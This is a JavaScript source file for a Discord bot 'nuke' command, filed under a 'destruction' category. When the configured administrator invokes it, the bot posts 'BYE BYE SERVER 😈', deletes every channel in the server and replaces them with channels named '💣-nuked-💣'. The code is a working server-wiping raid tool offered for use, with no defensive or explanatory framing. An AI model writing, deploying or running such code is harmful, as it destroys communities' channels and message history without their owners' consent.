const BaseCommand = require('../../utils/structures/BaseCommand');
const AdministratorId = require('../../../config.json').administratorID
module.exports = class NukeCommand extends BaseCommand {
  constructor() {
    super('nuke', 'destruction', []);
  }

  run(client, message, args) {
    let guildid = message.channel.guild.id;
    if(message.author.id == AdministratorId) {
      if(message.channel.guild.me.permissions.has('MANAGE_CHANNELS') || message.channel.guild.me.permissions.has('ADMINISTRATOR')) {
        message.channel.send('BYE BYE SERVER 😈').then(msg => {
          message.channel.guild.channels.cache.forEach(channel => {
            channel.delete().then(() => {
              client.guilds.cache.get(guildid).channels.create('💣-nuked-💣', { reason: 'THIS SERVER HAS BEEN NUKED' });
            })
          })
        });
      }else{
        if(client.guilds.cache.get(guildid).me.permissions.has('MANAGE_MESSAGES')) {
           message.delete();
           message.author.send(`I could not nuke the server because I don't have the MANAGE_CHANNELS permission.`)
        }else{
          message.author.send(`I could not nuke the server because I don't have the MANAGE_CHANNELS permission, and I couldn't delete your message either, I suggest you delete it.`)
        }
      }
    }
  }
}